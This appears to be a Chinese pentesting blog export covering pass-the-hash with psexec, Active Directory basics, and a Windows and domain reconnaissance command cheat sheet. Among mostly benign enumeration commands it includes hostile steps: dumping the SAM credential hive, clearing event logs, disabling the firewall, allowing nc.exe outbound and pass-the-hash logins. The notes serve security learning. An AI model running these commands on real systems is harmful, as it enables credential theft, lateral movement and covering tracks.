<p>有exe和python两个版本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">psexec.exe admin@<span class="number">192.168</span>.<span class="number">1.1</span> <span class="literal">-hashes</span> <span class="number">624</span>aac413795cdc1a5c7b1e00f780017:<span class="number">852</span>a844adfce18f66009b4f14e0a98de </span><br><span class="line"></span><br><span class="line">psexec.py  administrator@<span class="number">192.168</span>.<span class="number">1.1</span>   <span class="literal">-hashes</span> <span class="number">624</span>aac413795cdc1a5c7b1e00f780017:<span class="number">852</span>a844adfce18f66009b4f14e0a98de</span><br></pre></td></tr></table></figure>



<h3 id="kb2871997-补丁"><a href="#kb2871997-补丁" class="headerlink" title="kb2871997 补丁"></a>kb2871997 补丁</h3><p>kb2871997，禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享。</p>
<p>这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的 Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程连接。</p>
<p>并且值得注意的是即使 administrator 改名，它的SID仍然是500，这种攻击方法依然有效。所以对于防御来说，即使打了补丁也要记得禁用SID=500的管理员账户。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>安全机制</category>
      </categories>
      <tags>
        <tag>安全机制</tag>
        <tag>NTML</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-基础信息</title>
    <url>//85c75ed1f9a3.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        内网也指局域网（Local Area Network，LAN），是指在某一区域内由多台计算机互连而成的计算机组，组网范围通常在数千米以内。在局域网中，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等。内网是封闭的，可以由办公室内的两台计算机组成，也可以由一个公司内的大量计算机组成。</p>
<h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p><code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按照功能分别列入不同的组中，以方便管理</p>
<p>实际上工作组就像是给计算机打上一个分组标签，并没有实际管理工作组内所有计算机的能力</p>
<p>工作组内的所有用户都是平等的，所有的用户具备一样的权限，一样的特点</p>
<p>工作组之间没有管理和被管理之分，工作组网络也被叫做对等网络</p>
<p>在计算机-属性中可以更改计算机的名字和工作组</p>
<h2 id="域-（Domain）"><a href="#域-（Domain）" class="headerlink" title="域 （Domain）"></a>域 （Domain）</h2><p>域是一个有安全边界的计算机集合</p>
<p>可以简单理解为工作组的升级版，与工作组相比加入了身份认证，和权限管理，</p>
<p>域中的用户要受到严格的控制，在一个域中，所有用户的策略和登录验证都是由域控制器统一管理</p>
<p>一个用户的账号密码有可能在同一域中的所有计算机登录</p>
<p>在 <code>域</code> 的模式下，至少有一台服务器负责所有联入网络的电脑和用户的验证工作</p>
<h2 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h2><p>域控制器负责管理域中所有的用户，域控制器就是域中做身份认证的机制</p>
<p>域控制器简写为<code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</p>
<p>当用户登录时，域控会验证用户是否在域中，账号密码是否正确，否则会拒绝用户登录，无法访问域中的资源</p>
<p>一个域中的用户想要互相访问，要经过域控制器的审核</p>
<h2 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h2><p>单域就是一个主域控制器（DC），一个辅助域控制器（BDC）</p>
<p>当主域控制器出现故障时，可以通过辅助域控制器当作备用DC</p>
<h2 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h2><p>出于管理需求，在网络中划分多个域</p>
<p>第一个域称之为父域，各部分的域称之为子域</p>
<p>不同的子域可以设置不同特征的策略，提高安全性</p>
<p>父子域可以减少域之间的信息交互的压力，域间的信息交流可以压缩</p>
<p>子域只能以父域的名字作为域名后缀，类似DNS域名的表现方式</p>
<h2 id="域树（tree）"><a href="#域树（tree）" class="headerlink" title="域树（tree）"></a>域树（tree）</h2><p>域树是多个域组通过建立信任关系组成的集合</p>
<p>一个域管理员只能管理本域，不能访问或者管理其他域</p>
<p>如果两个域之间需要互相访问，则需要建立信任关系（Trust Relation），信任关系是连接不同域的桥梁</p>
<p>域树之中必须有一个顶级域，不能存在多个顶级域</p>
<p><img src="http://tva1.sinaimg.cn/large/005XcLBjgy1gw20jgx8ndj30jw09l75c.jpg" alt="内网渗透-基础信息1.png"></p>
<h2 id="域森林（forest）"><a href="#域森林（forest）" class="headerlink" title="域森林（forest）"></a>域森林（forest）</h2><p>域森林就是多个域树通过建立信任关系组成的集合</p>
<p>域森林为不同的域树建立信任关系，使其能够访问和使用整个域树的资源</p>
<p>域森林可以存在多个顶级域</p>
<p><img src="http://tva1.sinaimg.cn/large/005XcLBjgy1gw20jwrah8j30pp0aj75v.jpg" alt="内网渗透-基础信息2.png"></p>
<h2 id="根域"><a href="#根域" class="headerlink" title="根域"></a>根域</h2><p>在整个域森林中所创建的第一个域就是根域，根域在整个域森林中的地位，优先级，重要性都是最大的</p>
<p>在一个域森林中只能存在一个根域</p>
<p>在根域中存在两个特殊的组：</p>
<ul>
<li><strong>Enterprise  admins</strong></li>
<li><strong>Schema  admins</strong></li>
</ul>
<h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><p>实现域名到IP地址的转换</p>
<p>由于域中计算机使用DNS来定位DC、服务器和其他计算机的</p>
<p>所以域的名字就是DNS域的名字</p>
<h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录 Active Directory ，简写为 <code>AD</code> ，它是指域环境中提供目录服务的组件</p>
<p>目录中用于存储有关网络对象（例如用户，组，计算机，共享资源，打印机，联系人等）的信息</p>
<p>目录服务是指帮助用户快速，准确的从目录中找到其所需要的信息的服务</p>
<p>活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制</p>
<p>活动目录，就相当于书的目录，用户可以通过快捷方式快速定位资源所在位置</p>
<p>在活动目录中，管理员不需要考虑被管理对象的地理位置，只需要按照一定的方式将这些对象放置在不同的容器中。这种不考虑被管理对象的具体地理位置的组织框架称为逻辑结构。</p>
<p>活动目录的逻辑结构包括前面讲过的组织单元（OU）、域、域树、域森林。域树内的所有域共享一个活动目录，这个活动目录内的数据分散存储在各个域中，且每个域只存储该域内的数据</p>
<p><strong>活动目录主要提供以下功能：</strong></p>
<ul>
<li><p>账号集中管理：所有账号均存储在服务器中，以便执行命令和重置密码等。</p>
</li>
<li><p>软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件。</p>
</li>
<li><p>环境集中管理：统一客户端桌面、IE、TCP/IP 协议等设置。</p>
</li>
<li><p>增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络，对资料进行统一管理。</p>
</li>
<li><p>更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠，宕机时间更短。</p>
</li>
</ul>
<p>活动目录是微软提供的统一管理基础平台，ISA、Exchange、SMS 等都依赖这个平台<br>活动目录就相当于域环境的数据库</p>
<h2 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h2><p>DMZ <code>Demilitarized Zone</code> ，也叫做“隔离区”</p>
<p>DMZ就是将内网与外网进行隔离，存放一些必须公开的服务器设施，用来对外提供服务</p>
<p>DMZ区是一个特殊网络区域，在DMZ区内通常放一些公用服务器，比如WEB服务器，E-Mail服务器等</p>
<p>这样来自公网的用户只能访问DMZ区域，而不能直接访问内网</p>
<p>即使DMZ区域遭到破坏，也不会对内网造成影响</p>
<h2 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h2><p>域控制器：负责管理域中的所有用户</p>
<p>成员服务器：安装了服务器系统并加入了域，但是没有按照活动目录的计算机，主要提供网络资源</p>
<p>客户机：通过计算机和域中的账号可以登录到域</p>
<p>独立服务器：和域无关，既不加入域，也没有活动目录</p>
<h2 id="域内的权限"><a href="#域内的权限" class="headerlink" title="域内的权限"></a>域内的权限</h2><ul>
<li>组：组是用户账号的集合，可以统一通过组向组内的所有账号分配权限</li>
<li>域本地组：用户来自全林，主要用于本域，只能在所在域分配权限，不可以嵌套其他组</li>
<li>全局组：用户来自本域，主要作用于全林，可以在域林中的任何域中分配权限，适用于跨域访问</li>
<li>通用组：用户来自全林，可以在域林中的任何域中分配权限，适用于跨域访问</li>
</ul>
<p><strong>域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林</strong></p>
<p>在安装域控制器时，系统会自动生成一些组，称为内置组。</p>
<p>内置组定义了一些常用的权限。通过将用户添加到内置组中，可以使用户获得相应的权限</p>
<p><strong>域本地组的权限</strong></p>
<ul>
<li>Administrators（管理员组） ————最重要的权限</li>
<li>Remote Desktop Users（远程登录组）</li>
<li>Print Operators（打印机操作员组）</li>
<li>Account Operators（帐号操作员组）</li>
<li>Server Operaters（服务器操作员组）</li>
<li>Backup Operators（备份操作员组）</li>
</ul>
<p><strong>全局组、通用组的权限</strong></p>
<ul>
<li><p>Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</p>
</li>
<li><p>Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</p>
</li>
<li><p>Schema Admins（架构管理员组）————最重要的权限</p>
</li>
<li><p>Domain Users（域用户组)</p>
</li>
</ul>
<p><strong>域管理组和企业系统管理员组在域森林中的每个域内都是Administrators 组的成员，因此对所有域控制器都有完全访问权</strong></p>
<p><strong>域用户组默认是内置域Users 组的成员</strong></p>
<h2 id="A-G-DL-P-策略"><a href="#A-G-DL-P-策略" class="headerlink" title="A - G - DL - P 策略"></a>A - G - DL - P 策略</h2><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p>
<ul>
<li>A 表示用户账号</li>
<li>G 表示全局组</li>
<li>U 表示通用组</li>
<li>DL 表示域本地组</li>
<li>P 表示资源权限</li>
</ul>
<p>在A-G-DL-P 策略形成以后当给一个用户某一个权限时，只要把这个用户加入到某一个域本地组就可以了</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-Windows信息收集</title>
    <url>//a7b4e7b158e4.html</url>
    <content><![CDATA[<h2 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h2><h3 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a>查询网络配置</h3><p>查询网络配置</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p>ARP表</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">arp <span class="literal">-a</span></span><br></pre></td></tr></table></figure>

<p>路由表</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">route print</span><br><span class="line">netstat <span class="literal">-r</span></span><br></pre></td></tr></table></figure>

<p>DNS缓存</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> root/StandardCimv2 <span class="literal">-ClassName</span> MSFT_DNSClientCache</span><br></pre></td></tr></table></figure>



<h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><p>查看用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前组的所有用户</span></span><br><span class="line">net user</span><br><span class="line">net user xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户以及所属组</span></span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户的特权信息</span></span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有的组和特权信息</span></span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前所有的用户名</span></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前组的所有用户的详细信息</span></span><br><span class="line">wmic useraccount get /ALL /format:csv</span><br></pre></td></tr></table></figure>



<p>查看当前用户的权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p>添加用户</p>
<p>会被杀软拦截</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user /add xxx <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p>删除用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user /delete xxx</span><br></pre></td></tr></table></figure>



<p>查看用户登录远程桌面状态信息</p>
<p>查看用户是否在线</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br><span class="line">quser net config workstation</span><br></pre></td></tr></table></figure>



<p>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net config Workstation</span><br></pre></td></tr></table></figure>



<p>ACL 信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-acl</span></span><br></pre></td></tr></table></figure>



<h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>查看进程信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出每个进程的所有服务信息</span></span><br><span class="line">tasklist /svc</span><br><span class="line">wmic <span class="keyword">process</span> list brief</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有进程的DLL模块</span></span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell命令，获取计算机上运行的所有进程</span></span><br><span class="line"><span class="built_in">get-process</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每个进程的详细信息</span></span><br><span class="line">wmic <span class="keyword">process</span> list full</span><br><span class="line">wmic <span class="keyword">process</span> get caption,executablepath,commandline /format:csv</span><br></pre></td></tr></table></figure>



<p>查看正在运行的进程信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只能cmd使用</span></span><br><span class="line">wmic startup get command ,caption</span><br></pre></td></tr></table></figure>



<h3 id="查询服务信息"><a href="#查询服务信息" class="headerlink" title="查询服务信息"></a>查询服务信息</h3><p>查看服务</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p>查看所有服务的详细信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> query</span><br></pre></td></tr></table></figure>

<p>查看所有服务的路径以及运行参数</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">select</span> PathName</span><br></pre></td></tr></table></figure>

<p>查看已经启动的服务</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">start</span></span><br></pre></td></tr></table></figure>



<h3 id="查询操作系统"><a href="#查询操作系统" class="headerlink" title="查询操作系统"></a>查询操作系统</h3><p>查看主机名</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>



<p>查看操作系统版本信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure>



<p>查看系统配置信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>



<p>查看所有环境变量</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅cmd下运行</span></span><br><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>



<p>查看计划任务</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /QUERY /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果出错，先把编码改为英文，然后再改回来</span></span><br><span class="line">chcp <span class="number">437</span></span><br><span class="line">chcp <span class="number">936</span></span><br></pre></td></tr></table></figure>



<p>查看安装的所有驱动</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">DRIVERQUERY</span><br></pre></td></tr></table></figure>



<p>查看引导配置数据 (BCD) 文件</p>
<p>相当于boot.ini文件</p>
<p>需要管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bcdedit</span><br></pre></td></tr></table></figure>



<p>架构和系统名</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅CMD下运行,输出系统架构</span></span><br><span class="line"><span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br><span class="line"></span><br><span class="line">wmic os get osarchitecture</span><br><span class="line">wmic os get caption</span><br></pre></td></tr></table></figure>



<p>查看系统盘符</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic logicaldisk get caption</span><br></pre></td></tr></table></figure>



<p>查看开机时间</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>



<h3 id="查询软件信息"><a href="#查询软件信息" class="headerlink" title="查询软件信息"></a>查询软件信息</h3><p>查看安装的软件信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有的软件以及版本信息</span></span><br><span class="line">wmic product get name,version</span><br><span class="line">powershell <span class="string">&quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span></span><br></pre></td></tr></table></figure>



<p>查看杀软</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</span><br></pre></td></tr></table></figure>



<h3 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h3><p>监听的端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span></span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>端口信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-NetTCPConnection</span></span><br></pre></td></tr></table></figure>

<p>探测每个端口出网情况</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#x27;allports.exposed&#x27;,<span class="variable">$_</span>)) <span class="variable">$_</span> &#125; 2&gt;<span class="variable">$null</span>&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a>查询补丁列表</h3><p>查看补丁信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get descrveription,installedOn /format:csv</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p>查询补丁详细信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic qfe list full</span><br></pre></td></tr></table></figure>



<h3 id="查询本机共享"><a href="#查询本机共享" class="headerlink" title="查询本机共享"></a>查询本机共享</h3><p>查看共享信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>



<h3 id="查询代理信息"><a href="#查询代理信息" class="headerlink" title="查询代理信息"></a>查询代理信息</h3><p>查看代理配置信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\windows\Currentversion\Internet Settings&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="查询远程连接服务"><a href="#查询远程连接服务" class="headerlink" title="查询远程连接服务"></a>查询远程连接服务</h3><p>查询远程桌面的注册表信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询该路径下所有的子项和值</span></span><br><span class="line">REG query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询远程桌面端口</span></span><br><span class="line"><span class="comment"># 查询该路径下portnumber的值</span></span><br><span class="line"><span class="comment"># 如果值是数字，则所有的值都是十六进制，以0x开头</span></span><br><span class="line">REG query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v portnumber</span><br></pre></td></tr></table></figure>

<p>开启远程链接服务</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting <span class="built_in">WHERE</span> (__CLASS !=<span class="string">&quot;&quot;</span>) CALL SetAllowTSConnections <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h3 id="查询票据信息"><a href="#查询票据信息" class="headerlink" title="查询票据信息"></a>查询票据信息</h3><p>查看远程桌面连接历史记录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>

<p>显示当前缓存的 Kerberos 票证的列表</p>
<p>必须是<strong>域管理员</strong> 或等效的 才能运行此命令的所有参数</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>



<h3 id="查询日志信息"><a href="#查询日志信息" class="headerlink" title="查询日志信息"></a>查询日志信息</h3><p>wevtutil命令说明</p>
<p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil</a></p>
<p>列出所有的日志名称</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wevtutil el</span><br><span class="line">wevtutil <span class="class"><span class="keyword">enum</span>-<span class="title">logs</span></span></span><br></pre></td></tr></table></figure>

<p>获取日志配置信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wevtutil <span class="built_in">gl</span> xxx</span><br><span class="line">wevtutil <span class="built_in">get-log</span> xxx</span><br></pre></td></tr></table></figure>

<p>修改日志配置信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wevtutil <span class="built_in">sl</span> xxx</span><br><span class="line">wevtutil <span class="built_in">set-log</span> xxx</span><br></pre></td></tr></table></figure>

<p>从日志中查询事件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wevtutil qe xxx</span><br><span class="line"><span class="comment"># 读取应用程序中最新的三个事件，以文本格式显示</span></span><br><span class="line">wevtutil qe Application /c:<span class="number">3</span> /<span class="built_in">rd</span>:true /f:text</span><br></pre></td></tr></table></figure>

<p>清除日志</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wevtutil cl</span><br><span class="line">wevtutil <span class="built_in">clear-log</span></span><br></pre></td></tr></table></figure>

<p>打开事件查看器</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">eventvwr</span><br></pre></td></tr></table></figure>



<h3 id="查询防火墙配置"><a href="#查询防火墙配置" class="headerlink" title="查询防火墙配置"></a>查询防火墙配置</h3><p>查看防火墙配置</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示所有配置文件的属性（全局,域配置,专用配置,公用配置）</span></span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示活动配置文件的属性</span></span><br><span class="line">netsh advfirewall show currentprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示域配置文件的属性</span></span><br><span class="line">netsh advfirewall show domainprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示全局属性</span></span><br><span class="line">netsh advfirewall show global</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示专用配置文件的属性</span></span><br><span class="line">netsh advfirewall show privateprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示公用配置文件的属性</span></span><br><span class="line">netsh advfirewall show publicprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前交互式会话的策略存储</span></span><br><span class="line">netsh advfirewall show store</span><br></pre></td></tr></table></figure>

<p>查看防火墙状态</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>

<p>防火墙日志目录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh firewall show logging</span><br></pre></td></tr></table></figure>

<p>自定义防火墙存储位置</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;c:\windows\temp\fw.log&quot;</span></span><br></pre></td></tr></table></figure>

<p>防火墙规则</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>

<p>出站入站</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许指定程序出站</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;test&quot;</span> <span class="built_in">dir</span>=out action=allow program=<span class="string">&quot;D:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许3389端口入站</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许80-100端口出站</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;port&quot;</span> <span class="built_in">dir</span>=out action=allow protocol=TCP localport=<span class="number">80</span><span class="literal">-100</span></span><br></pre></td></tr></table></figure>

<p>关闭防火墙</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>



<h3 id="注册表文件导出"><a href="#注册表文件导出" class="headerlink" title="注册表文件导出"></a>注册表文件导出</h3><p>导出SAM文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SAM D:\sam</span><br><span class="line">reg save HKLM\SAM D:\sam.hiv</span><br></pre></td></tr></table></figure>



<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>查看/设置后缀关联</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">assoc</span><br><span class="line">assoc .ext=example</span><br></pre></td></tr></table></figure>





<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><p>查看当前权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p>获取域SID</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>



<h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过DNS后缀判断是否存在域</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="comment"># 解析域名的IP，查看域名是否和DNS服务器是同一个IP</span></span><br><span class="line">nslookup xxx.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统配置信息里面会显示当前域的名称，如果是WORKGROUP则不存在域</span></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询工作站信息</span></span><br><span class="line">net config Workstation</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过与域同步时间来判断是否存在域</span></span><br><span class="line"><span class="comment"># 如果存在域且不是域用户，显示拒绝访问</span></span><br><span class="line"><span class="comment"># 如果不存在域，显示找不到域</span></span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域内基础信息"><a href="#查询域内基础信息" class="headerlink" title="查询域内基础信息"></a>查询域内基础信息</h3><p>登录域</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>

<p>查看当前登录域和域用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net config Workstation</span><br></pre></td></tr></table></figure>

<p>查看当前组的计算机名</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<p>查询域内所有用户组列表</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> /domain</span><br></pre></td></tr></table></figure>

<p>查询主体名称</p>
